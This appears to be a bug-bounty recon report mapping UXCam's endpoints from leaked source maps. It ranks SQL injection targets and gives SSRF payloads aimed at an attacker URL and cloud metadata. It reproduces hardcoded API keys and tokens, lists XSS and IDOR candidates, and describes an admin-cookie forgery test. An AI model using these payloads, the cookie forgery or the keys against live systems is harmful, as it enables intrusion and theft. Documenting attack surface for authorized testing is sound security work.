# UXCam Source Map Deep Analysis

**Date**: 2026-09-27
**Target**: app.uxcam.com (*.uxcam.com in scope via Bugcrowd)
**Source**: 136 source maps (187 files, 136 parseable), 267 tara.uxcam.com JS files, 27 wayback JS files, www.uxcam.com JS
**Scope**: SQL injection surfaces, internal endpoints, secrets, injectable parameters
**EXCLUSION**: 2x SQLi P1 on dashboardapi analytics already reported

---

## 1. ARCHITECTURE

### Stack
- **Frontend**: Next.js + Webpack + Redux + Relay (GraphQL) + Axios + styled-components
- **Database**: Trino SQL engine (analytics), likely ClickHouse/Postgres behind it
- **Auth**: Cookie-based (token + CSRF-Token), Bearer token for auth/subscription APIs, token refresh via TokenRefreshManager
- **Admin**: admin.uxcam.com impersonation system with client-side cookie detection

### Backend Services (16 env vars)

| Env Var | Service | Purpose |
|---------|---------|---------|
| `API_URL` | dashboardapi (Node.js) | CRUD, session management, team, org |
| `PYTHON_API_URL` | Python API v1 | Legacy analytics, search, labels, notes |
| `PYTHON_API_URL_V2` | Python API v2 | Trino-backed analytics (sessions, users, events, funnels, screens) |
| `AUTH_API_URL` / `AUTH_BASE_URL` | Auth service | Login, signup, SSO, team, roles, token refresh |
| `SUBSCRIPTION_URL` | Billing service | Plans, invoices, Chargebee, access management |
| `DB_API_URL` | Database API | Deletion requests |
| `IDH_API_URL` | Internal Data Hub | Event ingestion |
| `REDIRECT_URL` | App frontend | Redirect handling, Planhat, hash-key |
| `TARA_PROD_API` | Tara AI prod | AI assistant backend |
| `TARA_UAT_API` | Tara AI UAT | AI assistant UAT |
| `TARA_STAGING_API` | Tara AI staging | AI assistant staging |
| `TARA_EXPERIENCE_API` | Tara Experience | AI experience backend |
| `TARA_CX_API` | Tara CX | CX backend |
| `TARA_BIZOPS_API` | Tara BizOps | BizOps backend |
| `TARA_RESEARCH_API` | Tara Research | Research backend |
| `TARA_DASHBOARD_URL` | Tara Dashboard | Dashboard URL |

### Tara AI Proxy Paths (Next.js server-side rewrites)
```
/_tara_prod     -> TARA_PROD_API
/_tara_uat      -> TARA_UAT_API
/_tara_staging  -> TARA_STAGING_API
/_tara_experience -> TARA_EXPERIENCE_API
/_tara_cx       -> TARA_CX_API
/_tara_bizops   -> TARA_BIZOPS_API
/_tara_research -> TARA_RESEARCH_API
```

### API Routing Logic
`getURLType()` in commonApi.js checks v2ApiList to route between PYTHON_API_URL and PYTHON_API_URL_V2. The 32 v2 endpoints use Trino; everything else goes to v1 Python.

---

## 2. ALL ENDPOINTS BY SERVICE

### 2.1 dashboardapi (API_URL) — Node.js

#### App Management
```
GET    /app/csrf                                     — CSRF token
GET    /app/dropdown                                 — App dropdown list
GET    /app/{appId}                                  — App details
GET    /app/{appId}/session                          — Sessions
GET    /app/{appId}/integration                      — Integration/install code
GET    /app/{appId}/user                             — User list
GET    /app/{appId}/session-filter                   — Session filter
GET    /app/{appId}/session-filter/create             — Create session filter
GET    /app/{appId}/video-recording                  — Video recording rules
GET    /app/{appId}/video-recording/create            — Create video recording rule
POST   /app/{appId}/session/custom-list              — Custom session list (FILTER)
POST   /app/{appId}/user/sessions                    — User sessions
POST   /app/{appId}/{type}/custom-list               — Filtered list by type *** INJECTABLE type param ***
POST   /app/{appId}/session-filter/search-attribute   — Session filter search
POST   /app/{appId}/{filter}/search-attribute         — Filter search *** INJECTABLE filter param ***
POST   /app/{appId}/screen/sessions                  — Screen sessions (accepts orderBy)
POST   /app/{appId}/video-recording                  — Save video recording rule
POST   /app/{appId}/team                             — Add team member
POST   /app/{appId}/team/resend-invite               — Resend invite
POST   /app/{appId}/team/members                     — Invite developer
PUT    /app/{appId}/update-name                      — Update app name
PUT    /app/{appId}/video-recording/{ruleId}          — Update video recording rule
PUT    /app/{appId}/video-recording/{ruleId}/apply    — Apply recording rule
PUT    /app/{appId}/video-recording/toggle-video-recording
PUT    /app/{appId}/session-recording/toggle-session-recording
PUT    /app/{appId}/team/update                      — Update user role
DELETE /app/{appId}                                  — Delete app
DELETE /app/{appId}/{type}                           — Delete users/sessions *** INJECTABLE type param ***
DELETE /app/{appId}/video-recording/{id}              — Delete recording rule
DELETE /app/{appId}/team                             — Remove team member
```

#### Organization
```
POST   /organization                                — Create org
POST   /organization/store-usage-stat               — Store usage stats
GET    /organization/csrf                            — Org CSRF token
GET    /organization/list                            — Org list
GET    /organization/{orgId}/app/list                — Org app list
GET    /organization/{orgId}/subscription/client-token — Subscription token
POST   /organization/{orgId}/subscription/query-premium-plan-change
POST   /organization/{orgId}/subscription/change-payment-method
POST   /organization/{orgId}/subscription/update-your-plan
POST   /organization/{orgId}/team                    — Invite member
PUT    /organization/{orgId}/team/update              — Change role
DELETE /organization/{orgId}/team                    — Delete member
POST   /organization/{orgId}/team/resend-invite      — Resend invite
DELETE /organization/{orgId}                         — Delete org
```

#### Sharing/Status
```
POST   /share/share-session                          — Share session
POST   /share/copy-share-session                     — Copy share session
GET    /share/app/{appId}/session/{sessionId}/crash-file-download
GET    /status/session-processing                    — Session processing status
POST   /forward                                      — *** GENERIC FORWARDING *** name+kwargs
```

#### Preferences
```
POST   /preference/column-visibility
POST   /preference/column-update
POST   /preference/column-position
POST   /preference/small-session-table-column-visibility
POST   /reset-column-preference
```

### 2.2 Python API v1 (PYTHON_API_URL)

#### Search/Filter
```
POST   /search_attribute                             — *** PRIORITY 1 SQLi target *** (free-text search)
POST   /filter_description                           — AI filter description
POST   /app/{appId}/{filter}/search-attribute         — Filter-specific search
POST   /app/{appId}/{type}/custom-list               — Custom list with filters
```

#### Users
```
POST   /users/list                                   — Users list (also v2)
POST   /users/statistics                             — User statistics
POST   /users/top_screen_duration                    — Top screens by duration
POST   /users/top_screen_count                       — Top screens by count
POST   /users/top_event_stat                         — Top events
POST   /users/issues_stat                            — Issues stats
GET    /users/grouping_dropdowns/{appId}             — Grouping options
```

#### AI Sessions
```
POST   /ai/sessions/list
POST   /ai/sessions/user_sessions
POST   /ai/sessions/ai_insights
POST   /ai/sessions/selected/analyze
POST   /ai/sessions/batch/analyze
POST   /ai/sessions/analyze/list/all
POST   /ai/sessions/analyze/list/recent
```

#### Issues/Crashes
```
POST   /crashes/crash_logs
POST   /crashes/public/crash_logs                    — *** PUBLIC endpoint ***
POST   /uifreezes/ui_freeze_logs
POST   /uifreezes/public/ui_freeze_logs              — *** PUBLIC endpoint ***
POST   /sessions                                     — Session issue graph
```

#### Labels/Notes/Preferences
```
POST   /label/session/update_custom_label
GET    /label/app/{appId}/get-all-custom-label
POST   /notes/session/create
POST   /notes/session/edit
POST   /notes/session/list
DELETE /notes/session/delete/{appid}/{note_id}
POST   /preference/column-sort-order                 — *** orderBy injection target ***
GET    /preference/{appId}/get-event-property-list
GET    /preference/{orgId}/event-limit-status
GET    /preference/event-limit-message
```

#### Segments
```
GET    /segment/app/{appId}/{page}/list
POST   /segment/app/{appId}/{page}/create
POST   /segment/app/{appId}/{page}/edit
DELETE /segment/app/{appId}/{page}/delete
```

#### Retention/Export
```
POST   /retention/cohort/create
POST   /csv_export/page_export                       — *** PRIORITY 6 SQLi *** (different code path)
```

#### Sage (AI)
```
POST   /sage/session-sage
POST   /sage/session-batch-notify
```

#### Screen/Heatmap (v1)
```
POST   /screens/heatmap
POST   /screen/update-screens-name
GET    /screen/display-screens-list
```

#### Chat/Miscellaneous
```
GET    /chat-preference/{appId}/retrieve
POST   /chat-preference/save
POST   /deletion-key?appid={appId}
GET    /deletion-key?appid={appId}
DELETE /deletion-key?appid={appId}
GET    /app/team/{appId}
POST   /no_code_event/list
POST   /events/event_count
POST   /events/list
```

### 2.3 Python API v2 (PYTHON_API_URL_V2) — Trino-backed

#### Sessions (Trino)
```
POST   /sessions/list                                — *** Session list with full filters ***
POST   /sessions/stat_box_data
POST   /sessions/build_session_graph
POST   /sessions/plotting_options
POST   /sessions/total_user_count
POST   /sessions/get-event-details
POST   /sessions/get-bug-details
POST   /sessions/get-all-screens
POST   /sessions/shortify                            — *** PUBLIC - no auth interceptors ***
```

#### Users (Trino)
```
POST   /users/list
POST   /users/statistics
POST   /users/get_details
POST   /users/get_map_details
POST   /users/top_screen_duration
POST   /users/top_event_stat
POST   /users/issues_stat
POST   /users/user_journey_dropdowns
POST   /users/user_journey_boxes
POST   /users/build_user_graph
POST   /users/user_journey_graph
```

#### Events (Trino)
```
POST   /events/build_event_graph
POST   /events/plotting_options
POST   /events/event_count
POST   /events/list
```

#### Funnels (Trino)
```
POST   /funnels/list
POST   /funnels/create
POST   /funnels/edit
POST   /funnels/delete
POST   /funnels/load
POST   /funnels/user_dropdown
POST   /funnels/list_screens
POST   /funnels/pin_funnel
POST   /funnels/recently_viewed
POST   /insights/funnel-suggestions                  — *** last_step_value = user text ***
```

#### Screens/Heatmaps (Trino)
```
POST   /screens/trino/heatmap                        — *** PRIORITY 3 ***
POST   /screens/trino/screen_stats
POST   /screens/trino/screen_gesture_types
POST   /screens/trino/screen_list
POST   /screens/trino/web/screen_list
POST   /screens/trino/sankey
POST   /screens/trino/sunburst
POST   /screens/sankey
POST   /screens/sunburst
POST   /screens/screen_stat_box
POST   /screens/screen_stat_graph
POST   /screens/screen_visit_list
POST   /screens/screen_device_class
POST   /screens/top_device_class
POST   /screens/heatmap/area-tooltip
POST   /screens/heatmap/images
POST   /screens/images
```

#### AI
```
POST   /ai/sessions/list
POST   /ai/sessions/stat_box_data
POST   /push-notification/stats
```

#### Trino Warmup
```
POST   /trino_warm_up
```

### 2.4 Auth Service (AUTH_API_URL / AUTH_BASE_URL)

```
POST   /refresh-token
POST   /login
POST   /signup
POST   /google-login
POST   /google-sign-in
POST   /reset-password
GET    /user/roles                                   — Roles and permissions
GET    /org/{orgId}/team
POST   /org/{orgId}/team/invite
PUT    /org/{orgId}/team/{id}
PUT    /org/{orgId}/team/invite/{inviteId}
POST   /org/{orgId}/team/invite/resend
POST   /org/{orgId}/team/delete
PUT    /org/{orgId}/transfer-ownership               — *** Transfer org ownership ***
POST   /org/request-access/{token}                   — *** Duplicate domain access ***
GET    /user/check-email
GET    /team/invitation/accept/{token}
```

### 2.5 Subscription/Billing Service (SUBSCRIPTION_URL)

```
POST   /app/create-with-region/organization/{orgId}
POST   /app/{appId}/update-app-image
GET    /organization/{orgId}/check-plan-status
GET    /organization/{orgId}/get-apps
GET    /organization/{orgId}/get-users
POST   /organization/{orgId}/manage-app-access
POST   /organization/{orgId}/manage-user-access
POST   /toggleAIForApp                               — Toggle AI for app
```

### 2.6 Settings API (DASHBOARD_BASE_URL)

```
GET    /profile/{endPoint}                           — *** endPoint is user-controlled ***
POST   /profile/{endPoint}                           — *** INJECTABLE path segment ***
GET    /{requestUrl}                                 — *** updatePaymentInfo - full path control ***
POST   /{requestUrl}                                 — *** INJECTABLE full path ***
GET    /{url}                                        — *** getChargebeeLink - path injection ***
PUT    /{url}                                        — *** updateChargebeeLink - path injection ***
```

### 2.7 Internal Data Hub (IDH_API_URL)

```
POST   /data-hub/send-event/                         — Track event (authenticated)
POST   /data-hub/send-event-public/                  — Track event (PUBLIC)
```

### 2.8 Other Endpoints

```
GET    https://websdk-proxy.uxcam.com/api/proxy?url=  — *** SSRF TARGET ***
GET    https://signup-app-details.uxcam.com/api/get-ip — IP geolocation
POST   https://signup-app-details.uxcam.com/api/create-company
POST   https://signup-app-details.uxcam.com/api/validate-email
POST   https://signup-app-details.uxcam.com/api/hssend
POST   https://signup-app-details.uxcam.com/api/hssend-form
POST   https://signup-app-details.uxcam.com/api/send-slack
GET    https://signup-app-details.uxcam.com/api/apptopia?appName=
GET    /sessions/list/{page}/{sessionid}              — Session list pagination
GET    /status                                        — Deletion API status
POST   ${REDIRECT_URL}/planhat/analytics              — Planhat tracking
GET    ${REDIRECT_URL}/get/hash-key                   — Hash key
GET    https://integration.mcp.uxcam.com/mcp/http     — MCP integration
```

---

## 3. TARA.UXCAM.COM EXCLUSIVE ENDPOINTS (271 paths)

### Admin/Internal (HIGH PRIORITY)
```
GET    /api/admin/{orgId}/users
GET    /api/internal/ai-costs/orgs?days=N
GET    /api/internal/ai-costs/orgs/{orgId}/users?days=N
GET    /api/internal/ai-costs/runs?days=N&org_id=X&user_id=X&limit=N&offset=N
GET    /api/internal/ai-costs/summary?days=N&org_id=X
GET    /api/internal/orgs?days=N&limit=N&offset=N&sort_by=X&sort_dir=X
GET    /api/internal/orgs/{orgId}?days=N
GET    /api/internal/overview?days=N
GET    /api/internal/users?emails=X&days=N
POST   /reload-prompts
GET    /healthz
```

### Tara AI/Chat
```
POST   /chat                                          (SSE streaming)
POST   /tara/cache/warm
GET    /default-response-instructions
POST   /default-response-instructions
POST   /api/apps/{appId}/chat/command
POST   /api/apps/{appId}/tara/runs
GET    /api/apps/{appId}/tara/runs/active
GET    /api/apps/{appId}/tara/runs/{runId}/stream      (SSE)
POST   /api/apps/{appId}/tara/runs/{runId}/cancel
PATCH  /api/apps/{appId}/tara/runs/{runId}/notification
GET    /api/apps/{appId}/tara-context-snapshots/{snapId}
POST   /api/chat/share
POST   /api/chat/share/{token}/claim
```

### Knowledge Base
```
GET    /api/knowledge/{id}/entries
POST   /api/knowledge/{id}/entries
GET    /api/knowledge/{id}/entries/{entryId}
PUT    /api/knowledge/{id}/entries/{entryId}
DELETE /api/knowledge/{id}/entries/{entryId}
GET    /api/knowledge/{id}/notes
POST   /api/knowledge/{id}/notes
GET    /api/knowledge/{id}/response-preferences
POST   /api/knowledge/{id}/response-preferences
GET    /api/knowledge/{id}/context-selection
```

### Debug Endpoints
```
GET    /api/apps/{appId}/debug/not-uploaded-sessions
GET    /api/apps/{appId}/debug/pipeline-loss
GET    /api/apps/{appId}/debug/pipeline-summary
GET    /api/apps/{appId}/debug/recording-loss
GET    /api/apps/{appId}/debug/upload-rate
GET    /_tara_*/debug/cost?invocation_id=X&app_id=Y
POST   /_tara_*/remove/chat
```

### Analytics (Tara)
```
GET    /api/analytics/schema
POST   /api/apps/{appId}/analytics/run
POST   /api/apps/{appId}/analytics/funnels/run
POST   /api/apps/{appId}/analytics/funnels/dropoff
GET    /api/apps/{appId}/analytics/property-catalog
GET    /api/apps/{appId}/analytics/property-catalog/values
POST   /api/apps/{appId}/analytics/retention/run
GET    /api/apps/{appId}/analytics/reports
POST   /api/apps/{appId}/analytics/report-proposals
POST   /api/apps/{appId}/nl-filter                    *** Natural language filter ***
POST   /api/apps/{appId}/command-center/search
```

### Impersonation
```
POST   /impersonation/start
POST   /impersonation/end
```

### Ticketing/Jira (30+ endpoints)
```
GET/POST/PUT/DELETE  /api/ticketing/apps/{appId}/projects
GET/POST/PUT/DELETE  /api/ticketing/apps/{appId}/tickets
GET/POST/PUT/DELETE  /api/ticketing/orgs/{orgId}/connection
```

### Projects/API Keys
```
GET/POST/PATCH/DELETE  /api/organizations/{orgId}/projects
GET/POST/PATCH/DELETE  /api/projects/{projId}/environments/{envId}/keys/{keyId}
POST                   /api/projects/{projId}/environments/{envId}/keys/{keyId}/revoke
```

### Settings
```
PUT    /api/settings/{orgId}/profile
PUT    /api/settings/profile/email
PUT    /api/settings/profile/password
PUT    /api/settings/profile/mfa/setup|enable|disable
POST   /api/settings/{orgId}/team/{memberId}/transfer-ownership
POST   /api/settings/{orgId}/team/invite
POST   /api/settings/{orgId}/team/delete
POST   /api/settings/{orgId}/payment-method
```

### Auth (Tara)
```
POST   /auth/logout
GET    /auth/status                                   *** Returns is_admin flag ***
POST   https://auth.uxcam.com/refresh-token
```

(Full list: 271 endpoints in tara_wayback.txt)

---

## 4. SQL INJECTION ATTACK SURFACES (NEW - NOT dashboardapi analytics)

**Database engine**: Trino (confirmed from source code warm-up calls and endpoint naming)

### PRIORITY 1: search_attribute endpoint
```
POST PYTHON_API_URL/search_attribute
Body: {
  "appid": "<appId>",
  "table": "<table_name>",       // session, event, gesture, appuser, screenvisit, no_code_event_rule
  "attribute": "<attribute>",     // user-selected
  "date_range": {"from": ..., "to": ...},
  "search": "<SEARCH_QUERY>",    // *** FREE-TEXT USER INPUT - LIKELY LIKE/ILIKE ***
  "dropdownLimit": 20,
  "filters": [],
  "property_name": "<name>",
  "has_mass_value": bool,
  "mass_value_segment_id": "<id>",
  "mass_values_id": "<id>"
}
```
**Why**: `search` is free-text from filter dropdown typeahead. Backend almost certainly uses LIKE/ILIKE in Trino SQL. `table` and `attribute` select query targets.

### PRIORITY 2: custom-list with orderBy
```
POST API_URL/app/{appId}/{type}/custom-list
POST API_URL/app/{appId}/screen/sessions
Body: {
  "page": 1,
  "filter": [...],
  "table": "<table_name>",        // *** INJECTABLE ***
  "dateRange": {...},
  "orderBy": "<COLUMN/DIRECTION>"  // *** DIRECTLY IN ORDER BY ***
}
```
**Why**: `orderBy` feeds directly into ORDER BY clause. `type` in URL is attacker-influenced (session/user/screen/event).

### PRIORITY 3: Trino heatmap endpoints
```
POST PYTHON_API_URL_V2/screens/trino/heatmap
POST PYTHON_API_URL_V2/screens/trino/screen_stats
POST PYTHON_API_URL_V2/screens/trino/screen_gesture_types
POST PYTHON_API_URL_V2/screens/trino/screen_list
POST PYTHON_API_URL_V2/screens/trino/web/screen_list
```
**Why**: Separate code path from confirmed SQLi. Same Trino backend, different endpoint handlers. Accept full filter payloads.

### PRIORITY 4: Event analytics
```
POST PYTHON_API_URL_V2/events/event_count
POST PYTHON_API_URL_V2/events/list
POST PYTHON_API_URL/no_code_event/list
```
**Why**: Different handler from session analytics. Accept filter payloads with event-specific attributes.

### PRIORITY 5: Funnel endpoints
```
POST PYTHON_API_URL_V2/funnels/list|load|create|edit|delete
POST PYTHON_API_URL_V2/funnels/user_dropdown
POST PYTHON_API_URL_V2/funnels/list_screens
POST PYTHON_API_URL_V2/insights/funnel-suggestions
```
**Why**: Complex query construction (steps, sequences). `last_step_value` in funnel-suggestions is user-typed text.

### PRIORITY 6: CSV export
```
POST PYTHON_API_URL/csv_export/page_export
```
**Why**: Different code path for export. May bypass validation on list endpoints.

### PRIORITY 7: AI sessions
```
POST PYTHON_API_URL/ai/sessions/list|user_sessions|ai_insights
POST PYTHON_API_URL/ai/sessions/selected/analyze
POST PYTHON_API_URL/ai/sessions/batch/analyze
```
**Why**: Newer code, potentially less hardened. `batch/analyze` accepts `session_ids` array.

### PRIORITY 8: Activity filter timezone
```
Parameter: activity_attribute_date_range.tz
```
**Why**: Timezone string passed to Trino date functions. If not parameterized, injectable.

### PRIORITY 9: Forward endpoint
```
POST API_URL/forward (or PYTHON_API_URL/forward/)
Body: {"name": "<function_name>", "kwargs": {...}, "appid": "<appId>"}
```
**Why**: Generic internal forwarding. `name` selects function, `kwargs` passed as arguments.

### Filter Payload Structure (all Trino endpoints)
```json
{
  "appid": "<appId>",
  "filters": [
    {
      "attribute": "<name>",         // filter attribute name
      "operator": "<op>",            // is, is_not, contains, starts_with, etc.
      "value": ["<USER_VALUE>"],     // PRIMARY INJECTION POINT
      "table": "<table>",            // session, event, gesture, appuser, screenvisit
      "property": {
        "name": "<prop_name>",
        "value": ["<prop_value>"]
      }
    }
  ],
  "date_range": {"from": "<iso>", "to": "<iso>"},
  "aggregation_list": {"attribute": "session_count", "type": "count", "table": "session", "operator": ""},
  "group_list": [{"table": "session", "attribute": "session_period_day", "period": 86400, "time_zone_offset": "<TZ>"}],
  "series_plot_options": {...},
  "page": 1,
  "output_format": "csv"
}
```

### Filter Tables
| Table | Attributes |
|-------|-----------|
| session | (default for unmapped attributes) |
| gesture | viewid, viewname, viewtype |
| screenvisit | session_screen_with_property |
| event | event_custom_property, event_name, event_activity_name |
| no_code_event_rule | nce_name |
| appuser | user_device_country, user_device_city, user_device_platform, user_device_class, user_device_manufacturer, user_device_os_version, user_device_model, user_app_version, user_device_id |

### Filter Operators
```
is, is_not, contains, not_contains, starts_with, ends_with,
greater_than, less_than, between, between_dates,
is_set, is_not_set, in, not_in
```

### Trino-Backed Endpoint Complete List (32 in v2ApiList + 17 direct)
```
sessions/list                    sessions/total_user_count
sessions/stat_box_data           sessions/build_session_graph
sessions/plotting_options        ai/sessions/list
ai/sessions/stat_box_data        users/list
users/statistics                 users/top_screen_duration
users/top_event_stat             users/issues_stat
users/user_journey_dropdowns     users/user_journey_boxes
users/build_user_graph           users/user_journey_graph
push-notification/stats          funnels/list
funnels/edit                     funnels/create
funnels/user_dropdown            funnels/load
funnels/delete                   funnels/list_screens
funnels/pin_funnel               screens/sankey
screens/sunburst                 screens/trino/sunburst
screens/trino/sankey             events/build_event_graph
events/plotting_options
```

---

## 5. SECRETS AND HARDCODED CREDENTIALS

### Google Maps API Key (HARDCODED)
```
Key: AIzaSyDqUr7-CbNA9BkzJYjK3zqQrUWyHgXq3Kw
Source: components/common/map.js
Context: Google Maps JavaScript API with geometry, drawing, places libraries
```

### Rollbar Access Token
```
Token: 603051ad5460401084c5fdce90bc0e32
Source: tara.uxcam.com JS bundle
```

### ReCAPTCHA Site Key
```
Key: 6Lc4T7YUAAAAAGOGPuZjdXA-_wPZ_LLsO1Xpj9B5
Source: tara.uxcam.com JS bundle
```

### HubSpot Portal ID
```
ID: 5081481
```

### MCP HTTP Endpoint
```
URL: https://integration.mcp.uxcam.com/mcp/http
```

### Auth Token Flow
```
Token cookie: cookies.get('token')
CSRF cookie: cookies.get('CSRF-Token')
Bearer auth: Authorization: Bearer ${authToken}
X-CSRF-Token header on dashboardapi requests
Token refresh: POST ${AUTH_API_URL}/refresh-token
Token expiry: 10 minutes default, 30s refresh buffer
localStorage: tokenExpiresAt
Cookie: logged_in (30 day max-age)
```

---

## 6. INJECTABLE PARAMETERS (447 unique parameter names)

### Path Segment Injection (settingApi.js)
```javascript
// endPoint directly in URL path
updateMFAStatus(data, endPoint) {
  return axiosInstance.put(`${DASHBOARD_BASE_URL}/profile/${endPoint}`, data)
}

// requestUrl directly in URL - FULL PATH CONTROL
updatePaymentInfo({requestUrl, data}) {
  return axiosInstance.post(`${DASHBOARD_BASE_URL}/${requestUrl}`, data)
}

// url param directly in path
getChargebeeLink(url) {
  return axiosInstance.get(`${SUBSCRIPTION_URL}/${url}`)
}
updateChargebeeLink(url, payload) {
  return axiosInstance.put(`${SUBSCRIPTION_URL}/${url}`, payload)
}
```

### SQL-Relevant Parameters
```
search          — Free-text in search_attribute (LIKE/ILIKE)
orderBy         — Direct ORDER BY clause
table           — Table selection for Trino queries
attribute       — Column selection
operator        — Comparison operator
value           — Filter values (array)
property_name   — Nested property name
property_value  — Nested property value
date_range      — Date range (from/to)
time_zone_offset — Timezone for date functions
activity_attribute_date_range.tz — Timezone string
group_list[].attribute — Grouping attribute
group_list[].period    — Grouping period
aggregation_list.attribute — Aggregation target
output_format   — csv/json
type            — URL path segment (session/user/screen/event)
filter          — URL path segment
name            — Forward endpoint function selector
kwargs          — Forward endpoint arguments
```

### IDOR-Relevant Parameters
```
appId, appid    — Application ID (in URL and body)
orgId           — Organization ID
customerId      — Customer ID (for transferOwnership)
sessionId       — Session ID
uxcamuserid     — User ID
note_id         — Note ID
ruleId          — Video recording rule ID
inviteId        — Invitation ID
segmentId       — Segment ID
shareKey        — Share key (for public endpoints)
token           — Various tokens (invitation, domain access)
dashId          — Dashboard ID (GraphQL)
reportId        — Report ID (GraphQL/Tara)
cohortId        — Cohort ID (GraphQL)
widgetId        — Widget ID (GraphQL)
heatmapId       — Heatmap ID (GraphQL)
```

### Full Parameter List (447 unique)
Top injectable parameters by category:

**Filter/Query**: appid, filters, attribute, operator, value, table, property_name, property_value, search, date_range, dateRange, page, output_format, orderBy, group_list, aggregation_list, series_plot_options, time_zone_offset, dropdownLimit, mass_value_segment_id, mass_values_id, has_mass_value

**Identity/Access**: orgId, customerId, uxcamuserid, token, invitationToken, secret, shareKey, email, password, otp

**Content**: name, description, title, content, custom_label, label, labelId, batch_name, persona, custom_title, newMessage

**URL/Path**: url, requestUrl, endPoint, redirectUrl, src, type, filter

---

## 7. SSRF VECTORS

### 7.0 Webhook SSRF via issue_notification (NEW - HIGH PRIORITY)
```
POST PYTHON_API_URL/issue_notification/test    — *** FIRES IMMEDIATELY ***
POST PYTHON_API_URL/issue_notification/save     — Saves + tests webhook
GET  PYTHON_API_URL/issue_notification/{appid}/configuration — Get config
```

**Payload**:
```json
{
  "appid": "<appId>",
  "notificationType": ["slack"],
  "slack": {
    "webhookUrl": "<ATTACKER_URL>",
    "channelName": "test",
    "isEnabled": true
  },
  "microsoft": {
    "webhookUrl": "<ATTACKER_URL>",
    "isEnabled": true
  },
  "notification": ["crash", "exception", "uifreeze"]
}
```

**Source**: `components/features/setting/AppSetting/IssueNotificationConfig/hooks.ts`

**Why critical**: The `/test` endpoint makes an immediate HTTP request to the user-supplied `webhookUrl`. The server does URL validation (returns 422 for "not a valid webhook URL"), but this validation may be bypassable with:
- Redirect chains (valid-looking URL that 302s to internal target)
- DNS rebinding
- URL parser differentials
- Cloud metadata endpoints formatted as webhook-like URLs

Test targets:
- `http://169.254.169.254/latest/meta-data/` (AWS metadata)
- `http://127.0.0.1:PORT/` (internal services)
- Collaborator/OOB URL to confirm outbound requests

### 7.1 websdk-proxy (CONFIRMED SSRF SURFACE)
```
URL: https://websdk-proxy.uxcam.com/api/proxy?url=${encodeURIComponent(url)}
Source: SessionReplay.ts, line ~1500
Code: this.__cssProxyFor = cssProxy ?? ((url: string) => 
  `https://websdk-proxy.uxcam.com/api/proxy?url=${encodeURIComponent(url)}`)
```
Server-side proxy that fetches user-supplied URLs for CSS recovery during session replay. Test for: internal metadata (169.254.169.254), localhost services, cloud endpoints.

### 7.2 Forward Endpoint
```
POST API_URL/forward
Body: {"name": "add_metadata_s3_video", "kwargs": {...}, "appid": "<appId>"}
```
Generic internal forwarding. Test for: function enumeration, SSRF via kwargs.

### 7.3 Tara AI Proxy Paths
```
/_tara_prod, /_tara_uat, /_tara_staging, /_tara_experience, /_tara_cx, /_tara_bizops, /_tara_research
```
Next.js rewrites proxying to backend services. Test for: path traversal to reach internal services.

### 7.4 Injection Pattern Stats
- 1,640 SSRF-related patterns found in source maps
- 36 dynamic fetch patterns
- 108 proxy/forward patterns
- 151 URL construction patterns
- 55 URL input patterns
- 130 webhook patterns

---

## 8. XSS VECTORS

### dangerouslySetInnerHTML (11 instances)

| File | Variable | Context |
|------|----------|---------|
| SharedSessionPage.js:346 | `errorMessage` | Error display on shared session page |
| SessionNoteList.js:231 | `content` (with @email substitution) | Session notes - user email content |
| SessionNoteList.js:248 | `content` (with time spans) | Session notes - time spans |
| Truncate.js:189 | `str` | Generic text truncation |
| SessionDetails/index.js:311 | `sessionDetail?.error?.message` | Session detail error |
| InfoAccordion/index.tsx:81 | `description` | Accordion content |
| Video/index.js:1242 | `noVideoMessage` | Video error message |
| aiSessions/SessionDetails/index.js:300 | `sessionDetail?.error?.message` | AI session error |
| useAISessionColumns.js:353 | `JSON.parse(tooltip)` | AI session tooltip - PARSES JSON THEN RENDERS |
| _app.tsx:98 | Web SDK loader script | Static content |
| Quote/GeneralInformation.js:8 | `quoteDetails?.issuedTo?.generalInformation` | Quote details |

**High-value XSS targets**:
1. **Session notes** (SessionNoteList.js) - User content with email mentions rendered via dangerouslySetInnerHTML. If note content is attacker-controlled and stored, this is stored XSS.
2. **AI session tooltip** (useAISessionColumns.js:353) - JSON.parse(tooltip) then rendered as HTML. If tooltip content comes from backend without sanitization.
3. **Quote details** (GeneralInformation.js) - `generalInformation` field rendered raw.

### Other XSS Patterns
- 105 DOM manipulation patterns
- 28 innerHTML patterns
- 10 postMessage patterns
- 8 blob URL patterns

---

## 9. GRAPHQL OPERATIONS (128 total via Relay)

### High-Value Mutations (IDOR targets)
```
DashboardDeleteMutation              — Delete any dashboard?
DashboardRenameMutation              — Rename any dashboard?
DashboardSelectorPinMutation         — Pin any dashboard?
DeleteCohortModalDeleteMutation      — Delete any cohort?
HeatmapSidebarItemDeleteMutation     — Delete any heatmap?
MemberItemChangeRoleMutation         — Change any member's role?
MemberItemUnassignMutation           — Unassign any member?
ExportCohortModalMutation            — Export any cohort's data?
NewShareDashboardPopupInviteMembersMutation — Invite to any dashboard?
NewShareDashboardPopupChangeAccessMutation  — Change any share access?
RetentionContextDeleteReportMutation — Delete any retention report?
SaveCohortModalSaveCohortMutation    — Save cohort (cross-org?)
UnsubscribeAlertMutation             — Unsubscribe anyone from alerts?
ViewCohortModalUpdateMutation        — Update any cohort?
DigestFormModalCreateEmailDigestMutation — Create digest for any user?
AlertContextCreateAlertMutation      — Create alert on any app?
```

### Cross-Tenant Query Targets
```
DuplicateDashboardPopupAllAppsQuery  — List ALL apps across orgs?
DuplicateWidgetPopupAllAppsQuery     — List ALL apps across orgs?
SharedDashboardViewQuery             — View shared dashboards cross-tenant?
SharedUserDataQuery                  — View shared user data cross-tenant?
```

---

## 10. ADMIN IMPERSONATION SYSTEM

### Client-Side Detection (app.uxcam.com)
```javascript
// redux/actions/profile.js
isLoggedInFromAdmin = !!parseInt(browserCookies.get('loggedInFromAdminDashboard'), 10)
isLoggedInAsAdminGuest = isLoggedInFromAdmin && browserCookies.get('loggedInType') === 'guest'
isLoggedInAsAdminAdmin = isLoggedInFromAdmin && browserCookies.get('loggedInType') === 'admin'
```
Cookies: `loggedInFromAdminDashboard=1`, `loggedInType=admin|guest`
Referrer set to: `https://admin.uxcam.com/`

### Server-Side Detection (tara.uxcam.com)
```
Header: X-Tara-Login-Type: admin|customer (from localStorage tara_login_type)
GET /auth/status returns: authenticated, user.is_admin, impersonation.active, admin_access_mode
POST /impersonation/start
POST /impersonation/end
```

**Testing vector**: Set `loggedInFromAdminDashboard=1` and `loggedInType=admin` cookies. If backend trusts these client-side cookies without server validation, this grants admin access.

---

## 11. WAYBACK/LEGACY ENDPOINTS

### Deprecated Backend Subdomains (may still respond)
```
https://dashboardapi.uxcam.com        — Legacy Node.js API
https://dashboardapi-sec.uxcam.com    — Sec environment API
